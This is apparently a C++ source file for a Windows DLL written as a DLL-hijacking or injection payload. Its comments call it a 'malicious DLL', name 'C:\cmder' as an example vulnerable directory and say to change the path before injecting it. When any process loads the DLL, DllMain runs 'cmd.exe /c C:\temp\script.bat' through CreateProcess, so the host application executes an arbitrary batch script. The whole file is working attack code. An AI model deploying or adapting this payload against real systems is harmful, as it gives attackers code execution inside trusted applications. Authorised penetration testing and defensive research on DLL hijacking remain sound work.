// dllmain.cpp
#include "windows.h"

void scriptExec(void) {

	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	// example with vulnerable directory : C:\\cmder
	// before inject the malicious DLL change this path
	TCHAR lpszClientPath[50] = TEXT("cmd.exe /c C:\\temp\\script.bat");
	if (CreateProcess(NULL, lpszClientPath, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
	{
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		scriptExec();
		break;

	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}